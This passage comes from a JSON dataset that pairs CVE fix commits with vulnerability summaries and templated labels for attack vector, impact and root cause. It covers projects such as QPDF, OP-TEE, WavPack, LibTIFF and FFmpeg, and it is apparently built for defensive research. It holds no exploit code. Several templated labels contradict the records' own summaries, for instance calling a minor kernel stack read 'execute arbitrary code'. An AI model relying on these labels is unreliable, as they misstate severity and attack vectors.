stream","Impact":"cause a denial of service","Root Cause":"caused by an endless loop","Attack Type":"remote attacker"},{"commit_id":"701b518d5c56a1449825a3a37a716c58e05e1c3e","cve_id":"CVE-2015-9252","cwe_id":"CWE-399","commit_message":"Detect recursion loops resolving objects (fixes #51)\n\nDuring parsing of an object, sometimes parts of the object have to be\nresolved. An example is stream lengths. If such an object directly or\nindirectly points to the object being parsed, it can cause an infinite\nloop. Guard against all cases of re-entrant resolution of objects.","summary":"An issue was discovered in QPDF before 7.0.0. Endless recursion causes stack exhaustion in QPDFTokenizer::resolveLiteral() in QPDFTokenizer.cc, related to the QPDF::resolve function in QPDF.cc.","commit_message_1":"detect recursion loop resolving object ( fix # <number> ) during parsing of an object , sometimes part of the object have to be resolved","Vulnerability Type":"Resource Management Errors","Attack Vector":"By persuading a victim to open a specially-crafted pdf file","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"0048b4837affd153897ed1222283492070027aa9","cve_id":"CVE-2015-9016","cwe_id":"CWE-362","commit_message":"blk-mq: fix race between timeout and freeing request\n\nInside timeout handler, blk_mq_tag_to_rq() is called\nto retrieve the request from one tag. This way is obviously\nwrong because the request can be freed any time and some\nfiedds of the request can't be trusted, then kernel oops\nmight be triggered[1].\n\nCurrently wrt. blk_mq_tag_to_rq(), the only special case is\nthat the flush request can share same tag with the request\ncloned from, and the two requests can't be active at the same\ntime, so this patch fixes the above issue by updating tags->rqs[tag]\nwith the active request(either flush rq or the request cloned\nfrom) of the tag.\n\nAlso blk_mq_tag_to_rq() gets much simplified with this patch.\n\nGiven blk_mq_tag_to_rq() is mainly for drivers and the caller must\nmake sure the request can't be freed, so in bt_for_each() this\nhelper is replaced with tags->rqs[tag].\n\n[1] kernel oops log\n[  439.696220] BUG: unable to handle kernel NULL pointer dereference at 0000000000000158^M\n[  439.697162] IP: [<ffffffff812d89ba>] blk_mq_tag_to_rq+0x21\/0x6e^M\n[  439.700653] PGD 7ef765067 PUD 7ef764067 PMD 0 ^M\n[  439.700653] Oops: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC ^M\n[  439.700653] Dumping ftrace buffer:^M\n[  439.700653]    (ftrace buffer empty)^M\n[  439.700653] Modules linked in: nbd ipv6 kvm_intel kvm serio_raw^M\n[  439.700653] CPU: 6 PID: 2779 Comm: stress-ng-sigfd Not tainted 4.2.0-rc5-next-20150805+ #265^M\n[  439.730500] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01\/01\/2011^M\n[  439.730500] task: ffff880605308000 ti: ffff88060530c000 task.ti: ffff88060530c000^M\n[  439.730500] RIP: 0010:[<ffffffff812d89ba>]  [<ffffffff812d89ba>] blk_mq_tag_to_rq+0x21\/0x6e^M\n[  439.730500] RSP: 0018:ffff880819203da0  EFLAGS: 00010283^M\n[  439.730500] RAX: ffff880811b0e000 RBX: ffff8800bb465f00 RCX: 0000000000000002^M\n[  439.730500] RDX: 0000000000000000 RSI: 0000000000000202 RDI: 0000000000000000^M\n[  439.730500] RBP: ffff880819203db0 R08: 0000000000000002 R09: 0000000000000000^M\n[  439.730500] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000202^M\n[  439.730500] R13: ffff880814104800 R14: 0000000000000002 R15: ffff880811a2ea00^M\n[  439.730500] FS:  00007f165b3f5740(0000) GS:ffff880819200000(0000) knlGS:0000000000000000^M\n[  439.730500] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b^M\n[  439.730500] CR2: 0000000000000158 CR3: 00000007ef766000 CR4: 00000000000006e0^M\n[  439.730500] Stack:^M\n[  439.730500]  0000000000000008 ffff8808114eed90 ffff880819203e00 ffffffff812dc104^M\n[  439.755663]  ffff880819203e40 ffffffff812d9f5e 0000020000000000 ffff8808114eed80^M\n[  439.755663] Call Trace:^M\n[  439.755663]  <IRQ> ^M\n[  439.755663]  [<ffffffff812dc104>] bt_for_each+0x6e\/0xc8^M\n[  439.755663]  [<ffffffff812d9f5e>] ? blk_mq_rq_timed_out+0x6a\/0x6a^M\n[  439.755663]  [<ffffffff812d9f5e>] ? blk_mq_rq_timed_out+0x6a\/0x6a^M\n[  439.755663]  [<ffffffff812dc1b3>] blk_mq_tag_busy_iter+0x55\/0x5e^M\n[  439.755663]  [<ffffffff812d88b4>] ? blk_mq_bio_to_request+0x38\/0x38^M\n[  439.755663]  [<ffffffff812d8911>] blk_mq_rq_timer+0x5d\/0xd4^M\n[  439.755663]  [<ffffffff810a3e10>] call_timer_fn+0xf7\/0x284^M\n[  439.755663]  [<ffffffff810a3d1e>] ? call_timer_fn+0x5\/0x284^M\n[  439.755663]  [<ffffffff812d88b4>] ? blk_mq_bio_to_request+0x38\/0x38^M\n[  439.755663]  [<ffffffff810a46d6>] run_timer_softirq+0x1ce\/0x1f8^M\n[  439.755663]  [<ffffffff8104c367>] __do_softirq+0x181\/0x3a4^M\n[  439.755663]  [<ffffffff8104c76e>] irq_exit+0x40\/0x94^M\n[  439.755663]  [<ffffffff81031482>] smp_apic_timer_interrupt+0x33\/0x3e^M\n[  439.755663]  [<ffffffff815559a4>] apic_timer_interrupt+0x84\/0x90^M\n[  439.755663]  <EOI> ^M\n[  439.755663]  [<ffffffff81554350>] ? _raw_spin_unlock_irq+0x32\/0x4a^M\n[  439.755663]  [<ffffffff8106a98b>] finish_task_switch+0xe0\/0x163^M\n[  439.755663]  [<ffffffff8106a94d>] ? finish_task_switch+0xa2\/0x163^M\n[  439.755663]  [<ffffffff81550066>] __schedule+0x469\/0x6cd^M\n[  439.755663]  [<ffffffff8155039b>] schedule+0x82\/0x9a^M\n[  439.789267]  [<ffffffff8119b28b>] signalfd_read+0x186\/0x49a^M\n[  439.790911]  [<ffffffff8106d86a>] ? wake_up_q+0x47\/0x47^M\n[  439.790911]  [<ffffffff811618c2>] __vfs_read+0x28\/0x9f^M\n[  439.790911]  [<ffffffff8117a289>] ? __fget_light+0x4d\/0x74^M\n[  439.790911]  [<ffffffff811620a7>] vfs_read+0x7a\/0xc6^M\n[  439.790911]  [<ffffffff8116292b>] SyS_read+0x49\/0x7f^M\n[  439.790911]  [<ffffffff81554c17>] entry_SYSCALL_64_fastpath+0x12\/0x6f^M\n[  439.790911] Code: 48 89 e5 e8 a9 b8 e7 ff 5d c3 0f 1f 44 00 00 55 89\nf2 48 89 e5 41 54 41 89 f4 53 48 8b 47 60 48 8b 1c d0 48 8b 7b 30 48 8b\n53 38 <48> 8b 87 58 01 00 00 48 85 c0 75 09 48 8b 97 88 0c 00 00 eb 10\n^M\n[  439.790911] RIP  [<ffffffff812d89ba>] blk_mq_tag_to_rq+0x21\/0x6e^M\n[  439.790911]  RSP <ffff880819203da0>^M\n[  439.790911] CR2: 0000000000000158^M\n[  439.790911] ---[ end trace d40af58949325661 ]---^M\n\nCc: <stable@vger.kernel.org>\nSigned-off-by: Ming Lei <ming.lei@canonical.com>\nSigned-off-by: Jens Axboe <axboe@fb.com>","summary":"In blk_mq_tag_to_rq in blk-mq.c in the upstream kernel, there is a possible use after free due to a race condition when a request has been previously freed by blk_mq_complete_request. This could lead to local escalation of privilege. Product: Android. Versions: Android kernel. Android ID: A-63083046.","commit_message_1":"fix race between timeout and freeing request inside timeout handler , blk_mq_tag_to_rq ( ) is called to retrieve the request from one tag","Vulnerability Type":"Race Condition","Attack Vector":"By persuading a victim to open a specially-crafted application","Impact":"gain elevated privileges","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"3c5eb8b1be544e41d2c336191bc4936300ad7543","cve_id":"CVE-2014-8130","cwe_id":"CWE-369","commit_message":"* libtiff\/tif_{unix,vms,win32}.c (_TIFFmalloc): ANSI C does not\nrequire malloc() to return NULL pointer if requested allocation\nsize is zero.  Assure that _TIFFmalloc does.","summary":"The _TIFFmalloc function in tif_unix.c in LibTIFF 4.0.3 does not reject a zero size, which allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted TIFF image that is mishandled by the TIFFWriteScanline function in tif_write.c, as demonstrated by tiffdither.","commit_message_1":"ansi c doe not require malloc ( ) to return null pointer if requested allocation size is zero","Vulnerability Type":"Divide By Zero","Attack Vector":"via a crafted tiff image that is mishandled by the tiffwritescanline function in tif _ write . c , as demonstrated by tiffdither","Impact":"cause a denial of service ( divide - by - zero error and application crash )","Root Cause":"does not reject a zero size","Attack Type":"remote attacker"},{"commit_id":"33a0025d1d63ccd05d9dbaa6923d52b1446a62fe","cve_id":"CVE-2019-1010319","cwe_id":"CWE-665","commit_message":"issue #68: clear WaveHeader at start to prevent uninitialized read","summary":"WavPack 5.1.0 and earlier is affected by: CWE-457: Use of Uninitialized Variable. The impact is: Unexpected control flow, crashes, and segfaults. The component is: ParseWave64HeaderConfig (wave64.c:211). The attack vector is: Maliciously crafted .wav file. The fixed version is: After commit https:\/\/github.com\/dbry\/WavPack\/commit\/33a0025d1d63ccd05d9dbaa6923d52b1446a62fe.","commit_message_1":"clear waveheader at start to prevent uninitialized read","Vulnerability Type":"Improper Initialization","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by the use of an uninitialized variable","Attack Type":"remote attacker"},{"commit_id":"f68a9555b548306c5b1ee45199ccdc4a16a6101b","cve_id":"CVE-2019-1010317","cwe_id":"CWE-665","commit_message":"issue #66: make sure CAF files have a \"desc\" chunk","summary":"WavPack 5.1.0 and earlier is affected by: CWE-457: Use of Uninitialized Variable. The impact is: Unexpected control flow, crashes, and segfaults. The component is: ParseCaffHeaderConfig (caff.c:486). The attack vector is: Maliciously crafted .wav file. The fixed version is: After commit https:\/\/github.com\/dbry\/WavPack\/commit\/f68a9555b548306c5b1ee45199ccdc4a16a6101b.","commit_message_1":"make sure caf file have a `` desc '' chunk","Vulnerability Type":"Improper Initialization","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by the use of an uninitialized variable","Attack Type":"remote attacker"},{"commit_id":"4c0faba32fddbd0745cbfaf1e1aeb3da5d35b9fc","cve_id":"CVE-2019-1010315","cwe_id":"CWE-369","commit_message":"issue #65: make sure DSDIFF files have a valid channel count","summary":"WavPack 5.1 and earlier is affected by: CWE 369: Divide by Zero. The impact is: Divide by zero can lead to sudden crash of a software\/service that tries to parse a .wav file. The component is: ParseDsdiffHeaderConfig (dsdiff.c:282). The attack vector is: Maliciously crafted .wav file. The fixed version is: After commit https:\/\/github.com\/dbry\/WavPack\/commit\/4c0faba32fddbd0745cbfaf1e1aeb3da5d35b9fc.","commit_message_1":"make sure dsdiff file have a valid channel count","Vulnerability Type":"Divide By Zero","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by divide by zero","Attack Type":"remote attacker"},{"commit_id":"2f084136cfe0d05e5bf5703f3e83c6d955234b4d","cve_id":"CVE-2019-1010305","cwe_id":"CWE-119","commit_message":"length checks when looking for control files","summary":"libmspack 0.9.1alpha is affected by: Buffer Overflow. The impact is: Information Disclosure. The component is: function chmd_read_headers() in libmspack(file libmspack\/mspack\/chmd.c). The attack vector is: the victim must open a specially crafted chm file. The fixed version is: after commit 2f084136cfe0d05e5bf5703f3e83c6d955234b4d.","commit_message_1":"length check when looking for control file","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"obtain sensitive information","Root Cause":"is affected by : buffer overflow","Attack Type":"remote attacker"},{"commit_id":"70697bf3c5dc3d201341b01a1a8e5bc6d2fb48f8","cve_id":"CVE-2019-1010298","cwe_id":"CWE-119","commit_message":"svc: check for allocation overflow in crypto calls part 2\n\nWithout checking for overflow there is a risk of allocating a buffer\nwith size smaller than anticipated and as a consequence of that it might\nlead to a heap based overflow with attacker controlled data written\noutside the boundaries of the buffer.\n\nFixes: OP-TEE-2018-0011: \"Integer overflow in crypto system calls (x2)\"\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Jens Wiklander <jens.wiklander@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>","summary":"Linaro\/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Buffer Overflow. The impact is: Code execution in the context of TEE core (kernel). The component is: optee_os. The fixed version is: 3.4.0 and later.","commit_message_1":"check for allocation overflow in crypto call part <number> without checking for overflow there is a risk of allocating a buffer with size smaller than anticipated and a a consequence of that it might lead to a heap based overflow with attacker controlled data written outside the boundary of the buffer","Vulnerability Type":"buffer overflow","Attack Vector":"By sending an overly long argument","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"is affected by : buffer overflow","Attack Type":"local attacker"},{"commit_id":"a637243270fc1faae16de059091795c32d86e65e","cve_id":"CVE-2019-1010297","cwe_id":"CWE-119","commit_message":"svc: check for allocation overflow in crypto calls\n\nWithout checking for overflow there is a risk of allocating a buffer\nwith size smaller than anticipated and as a consequence of that it might\nlead to a heap based overflow with attacker controlled data written\noutside the boundaries of the buffer.\n\nFixes: OP-TEE-2018-0010: \"Integer overflow in crypto system calls (x2)\"\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Jens Wiklander <jens.wiklander@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>","summary":"Linaro\/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Buffer Overflow. The impact is: Execution of code in TEE core (kernel) context. The component is: optee_os. The fixed version is: 3.4.0 and later.","commit_message_1":"check for allocation overflow in crypto call without checking for overflow there is a risk of allocating a buffer with size smaller than anticipated and a a consequence of that it might lead to a heap based overflow with attacker controlled data written outside the boundary of the buffer","Vulnerability Type":"buffer overflow","Attack Vector":"By sending an overly long argument","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"is affected by : buffer overflow","Attack Type":"local attacker"},{"commit_id":"b60e1cee406a1ff521145ab9534370dfb85dd592","cve_id":"CVE-2019-1010296","cwe_id":"CWE-119","commit_message":"svc: check for allocation overflow in syscall_cryp_obj_populate\n\nWithout checking for overflow there is a risk of allocating a buffer\nwith size smaller than anticipated and as a consequence of that it might\nlead to a heap based overflow with attacker controlled data written\noutside the boundaries of the buffer.\n\nFixes: OP-TEE-2018-0009: \"Integer overflow in crypto system calls\"\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Jens Wiklander <jens.wiklander@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>","summary":"Linaro\/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Buffer Overflow. The impact is: Code execution in context of TEE core (kernel). The component is: optee_os. The fixed version is: 3.4.0 and later.","commit_message_1":"check for allocation overflow in syscall_cryp_obj_populate without checking for overflow there is a risk of allocating a buffer with size smaller than anticipated and a a consequence of that it might lead to a heap based overflow with attacker controlled data written outside the boundary of the buffer","Vulnerability Type":"buffer overflow","Attack Vector":"By sending an overly long argument","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"is affected by : buffer overflow","Attack Type":"local attacker"},{"commit_id":"d5c5b0b77b2b589666024d219a8007b3f5b6faeb","cve_id":"CVE-2019-1010295","cwe_id":"CWE-119","commit_message":"core: svc: always check ta parameters\n\nAlways check TA parameters from a user TA. This prevents a user TA from\npassing invalid pointers to a pseudo TA.\n\nFixes: OP-TEE-2018-0007: \"Buffer checks missing when calling pseudo\nTAs\".\n\nSigned-off-by: Jens Wiklander <jens.wiklander@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Joakim Bech <joakim.bech@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>","summary":"Linaro\/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Buffer Overflow. The impact is: Memory corruption and disclosure of memory content. The component is: optee_os. The fixed version is: 3.4.0 and later.","commit_message_1":"svc : always check ta parameter always check ta parameter from a user ta","Vulnerability Type":"buffer overflow","Attack Vector":"By sending an overly long argument","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"is affected by : buffer overflow","Attack Type":"local attacker"},{"commit_id":"7e768f8a473409215fe3fff8f6e31f8a3a0103c6","cve_id":"CVE-2019-1010294","cwe_id":"CWE-189","commit_message":"core: clear the entire TA area\n\nPreviously we cleared (memset to zero) the size corresponding to code\nand data segments, however the allocation for the TA is made on the\ngranularity of the memory pool, meaning that we did not clear all memory\nand because of that we could potentially leak code and data of a\nprevious loaded TA.\n\nFixes: OP-TEE-2018-0006: \"Potential disclosure of previously loaded TA\ncode and data\"\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nSuggested-by: Jens Wiklander <jens.wiklander@linaro.org>\nReviewed-by: Jens Wiklander <jens.wiklander@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>","summary":"Linaro\/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Rounding error. The impact is: Potentially leaking code and\/or data from previous Trusted Application. The component is: optee_os. The fixed version is: 3.4.0 and later.","commit_message_1":"clear the entire ta area previously we cleared ( memset to zero ) the size corresponding to code and data segment , however the allocation for the ta is made on the granularity of the memory pool , meaning that we did not clear all memory and because of that we could potentially leak code and data of a previous loaded ta","Vulnerability Type":"Numeric Errors","Attack Vector":"rounding error in the optee_os component","Impact":"Potentially leaking code and\/or data from previous Trusted Application","Root Cause":"caused by rounding error","Attack Type":"local attacker"},{"commit_id":"95f36d661f2b75887772ea28baaad904bde96970","cve_id":"CVE-2019-1010293","cwe_id":"CWE-20","commit_message":"core: tee_mmu_check_access_rights() check all pages\n\nPrior to this patch tee_mmu_check_access_rights() checks an address in\neach page of a supplied range. If both the start and length of that\nrange is unaligned the last page in the range is sometimes not checked.\nWith this patch the first address of each page in the range is checked\nto simplify the logic of checking each page and the range and also to\ncover the last page under all circumstances.\n\nFixes: OP-TEE-2018-0005: \"tee_mmu_check_access_rights does not check\nfinal page of TA buffer\"\n\nSigned-off-by: Jens Wiklander <jens.wiklander@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Joakim Bech <joakim.bech@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>","summary":"Linaro\/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Boundary crossing. The impact is: Memory corruption of the TEE itself. The component is: optee_os. The fixed version is: 3.4.0 and later.","commit_message_1":"tee_mmu_check_access_rights ( ) check all page prior to this patch tee_mmu_check_access_rights ( ) check an address in each page of a supplied range","Vulnerability Type":"Improper Input Validation","Attack Vector":"Boundary crossing","Impact":"cause a denial of service","Root Cause":"caused by boundary crossing","Attack Type":"local attacker"},{"commit_id":"e3adcf566cb278444830e7badfdcc3983e334fd1","cve_id":"CVE-2019-1010292","cwe_id":"CWE-119","commit_message":"core: ensure that supplied range matches MOBJ\n\nIn set_rmem_param() if the MOBJ is found by the cookie it's verified to\nrepresent non-secure shared memory. Prior to this patch the supplied\nsub-range to be used of the MOBJ was not checked here and relied on\nlater checks further down the chain. Those checks seems to be enough\nfor user TAs, but not for pseudo TAs where the size isn't checked.\n\nThis patch adds a check for offset and size to see that they remain\ninside the memory covered by the MOBJ.\n\nFixes: OP-TEE-2018-0004: \"Unchecked parameters are passed through from\nREE\".\n\nSigned-off-by: Jens Wiklander <jens.wiklander@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nReviewed-by: Joakim Bech <joakim.bech@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>","summary":"Linaro\/OP-TEE OP-TEE Prior to version v3.4.0 is affected by: Boundary checks. The impact is: This could lead to corruption of any memory which the TA can access. The component is: optee_os. The fixed version is: v3.4.0.","commit_message_1":"ensure that supplied range match mobj in set_rmem_param ( ) if the mobj is found by the cookie it 's verified to represent non-secure shared memory","Vulnerability Type":"buffer overflow","Attack Vector":"By sending an overly long argument","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"is affected by : buffer overflow","Attack Type":"local attacker"},{"commit_id":"132a4111bf3791e76437619a66336dce2ce4c79b","cve_id":"CVE-2019-1010247","cwe_id":"CWE-79","commit_message":"release 2.3.10.2: fix XSS vulnerability for poll parameter\n\nin OIDC Session Management RP iframe; CSNC-2019-001; thanks Mischa\nBachmann\n\nSigned-off-by: Hans Zandbelt <hans.zandbelt@zmartzone.eu>","summary":"ZmartZone IAM mod_auth_openidc 2.3.10.1 and earlier is affected by: Cross Site Scripting (XSS). The impact is: Redirecting the user to a phishing page or interacting with the application on behalf of the user. The component is: File: src\/mod_auth_openidc.c, Line: 3109. The fixed version is: 2.3.10.2.","commit_message_1":"fix x vulnerability for poll parameter in oidc session management rp iframe ; csnc-<number>-<number> ; thanks mischa bachmann","Vulnerability Type":"Cross-site Scripting","Attack Vector":"using a specially-crafted URL to execute script in a victim's Web browser within the security context of the hosting Web site","Impact":"Redirecting the user to a phishing page or interacting with the application on behalf of the user","Root Cause":"caused by improper validation of user-supplied input","Attack Type":"remote attacker"},{"commit_id":"be749d7efa7c9021da746e685bd6dec79f9dd99b","cve_id":"CVE-2019-1010239","cwe_id":"CWE-754","commit_message":"Fix crash of cJSON_GetObjectItemCaseSensitive when calling it on arrays","summary":"DaveGamble\/cJSON cJSON 1.7.8 is affected by: Improper Check for Unusual or Exceptional Conditions. The impact is: Null dereference, so attack can cause denial of service. The component is: cJSON_GetObjectItemCaseSensitive() function. The attack vector is: crafted json file. The fixed version is: 1.7.9 and later.","commit_message_1":"fix crash of cjson_getobjectitemcasesensitive when calling it on array","Vulnerability Type":"Improper Check for Unusual or Exceptional Conditions","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by improper validation of short files","Attack Type":"remote attacker"},{"commit_id":"f30f9339c9a0b9bbcc6f5ad38804af39db1f479e","cve_id":"CVE-2019-1010208","cwe_id":"CWE-119","commit_message":"Windows: fix low severity vulnerability in driver that allowed reading 3 bytes of kernel stack memory (with a rare possibility of 25 additional bytes). Reported by Tim Harrison.","summary":"IDRIX, Truecrypt Veracrypt, Truecrypt Prior to 1.23-Hotfix-1 (Veracrypt), all versions (Truecrypt) is affected by: Buffer Overflow. The impact is: Minor information disclosure of kernel stack. The component is: Veracrypt NT Driver (veracrypt.sys). The attack vector is: Locally executed code, IOCTL request to driver. The fixed version is: 1.23-Hotfix-1.","commit_message_1":"fix low severity vulnerability in driver that allowed reading <number> byte of kernel stack memory ( with a rare possibility of <number> additional byte )","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted IOCTL request to driver","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"21674033ee246f698887604c7af7ba1962a40ddf","cve_id":"CVE-2019-17546","cwe_id":null,"commit_message":"Internal libtiff: fix integer overflow potentially causing write heap buffer overflow, especially on 32 bit builds. Fixes https:\/\/bugs.chromium.org\/p\/oss-fuzz\/issues\/detail?id=16443. Credit to OSS Fuzz","summary":"tif_getimage.c in LibTIFF through 4.0.10, as used in GDAL through 3.0.1 and other products, has an integer overflow that potentially causes a heap-based buffer overflow via a crafted RGBA image, related to a *Negative-size-param* condition.","commit_message_1":"fix integer overflow potentially causing write heap buffer overflow , especially on <number> bit build","Vulnerability Type":"unspecified","Attack Vector":"a crafted rgba image , related to a * negative - size - param * condition","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"has an integer overflow that potentially causes a heap - based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"148115fcc40f1651a5d15fa34c9a8c528e7147bb","cve_id":"CVE-2019-17545","cwe_id":null,"commit_message":"OGRExpatRealloc(): fix double-free when size to allocate is above the default 10MB threshold. Fixes https:\/\/bugs.chromium.org\/p\/oss-fuzz\/issues\/detail?id=16178. Credit to OSS Fuzz","summary":"GDAL through 3.0.1 has a poolDestroy double free in OGRExpatRealloc in ogr\/ogr_expat.cpp when the 10MB threshold is exceeded.","commit_message_1":"fix double-free when size to allocate is above the default 10mb threshold","Vulnerability Type":"unspecified","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a pooldestroy double free","Attack Type":"remote attacker"},{"commit_id":"80fa26c74279fced8d778351cff19d1d8f44fe4e","cve_id":"CVE-2019-17544","cwe_id":null,"commit_message":"Fix various bugs found by OSS-Fuze.","summary":"libaspell.a in GNU Aspell before 0.60.8 has a stack-based buffer over-read in acommon::unescape in common\/getdata.cpp via an isolated  character.","commit_message_1":"fix various bug found by oss-fuze","Vulnerability Type":"unspecified","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a stack - based buffer over - read","Attack Type":"remote attacker"},{"commit_id":"02f909dc24b1f05cfbba75077c7707b905e63cd2","cve_id":"CVE-2019-17542","cwe_id":null,"commit_message":"avcodec\/vqavideo: Set video size\n\nFixes: out of array access\nFixes: 15919\/clusterfuzz-testcase-minimized-ffmpeg_AV_CODEC_ID_VQA_fuzzer-5657368257363968\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/projects\/ffmpeg\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"FFmpeg before 4.2 has a heap-based buffer overflow in vqa_decode_chunk because of an out-of-array access in vqa_decode_init in libavcodec\/vqavideo.c.","commit_message_1":"avcodec\/vqavideo : set video size","Vulnerability Type":"heap - based buffer overflow in vqa","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"39f226a9c137f547e12afde972eeba7551124493","cve_id":"CVE-2019-17541","cwe_id":null,"commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1641","summary":"ImageMagick before 7.0.8-55 has a use-after-free in DestroyStringInfo in MagickCore\/string.c because the error manager is mishandled in coders\/jpeg.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"use-after-free","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"execute arbitrary code","Root Cause":"has a use - after - free","Attack Type":"remote attacker"},{"commit_id":"8df6884832ec413cf032dfaa45c23b1c7876670c","cve_id":"CVE-2019-17539","cwe_id":null,"commit_message":"avcodec\/utils: Check close before calling it\n\nFixes: NULL pointer dereference\nFixes: 15733\/clusterfuzz-testcase-minimized-ffmpeg_AV_CODEC_ID_IDF_fuzzer-5658616977162240\n\nReviewed-by: Paul B Mahol <onemda@gmail.com>\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/projects\/ffmpeg\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In FFmpeg before 4.2, avcodec_open2 in libavcodec\/utils.c allows a NULL pointer dereference and possibly unspecified other impact when there is no valid close function pointer.","commit_message_1":"avcodec\/utils : check close before calling it","Vulnerability Type":"unspecified","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"execute arbitrary code","Root Cause":"caused by a a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"ce684dd008532ea0bf9d4a1d89bacb35f4a83f4d","cve_id":"CVE-2019-17534","cwe_id":null,"commit_message":"fetch map after DGifGetImageDesc()\n\nEarlier refactoring broke GIF map fetch.","summary":"vips_foreign_load_gif_scan_image in foreign\/gifload.c in libvips before 8.8.2 tries to access a color map before a DGifGetImageDesc call, leading to a use-after-free.","commit_message_1":"fetch map after dgifgetimagedesc ( ) earlier refactoring broke gif map fetch","Vulnerability Type":"use-after-free","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"tries to access a color map before a dgifgetimagedesc call ","Attack Type":"remote attacker"},{"commit_id":"651a8e28099edb5fbb9e4e1d4d3238848f446c9a","cve_id":"CVE-2019-17533","cwe_id":null,"commit_message":"Avoid uninitialized memory\n\nAs reported by https:\/\/bugs.chromium.org\/p\/oss-fuzz\/issues\/detail?id=16856","summary":"Mat_VarReadNextInfo4 in mat4.c in MATIO 1.5.17 omits a certain '0' character, leading to a heap-based buffer over-read in strdup_vprintf when uninitialized memory is accessed.","commit_message_1":"avoid uninitialized memory a reported by http : \/\/<file>","Vulnerability Type":"heap-based buffer","Attack Vector":"By persuading a victim to open a specially-crafted MAT-file","Impact":"cause a denial of service","Root Cause":"omits a certain ' 0 ' character","Attack Type":"remote attacker"},{"commit_id":"6ef36ab967c71690ebe7e5ef997a8be4da3bc844","cve_id":"CVE-2019-17351","cwe_id":"CWE-400","commit_message":"xen: let alloc_xenballooned_pages() fail if not enough memory free\n\ncommit a1078e821b605813b63bf6bca414a85f804d5c66 upstream.\n\nInstead of trying to allocate pages with GFP_USER in\nadd_ballooned_pages() check the available free memory 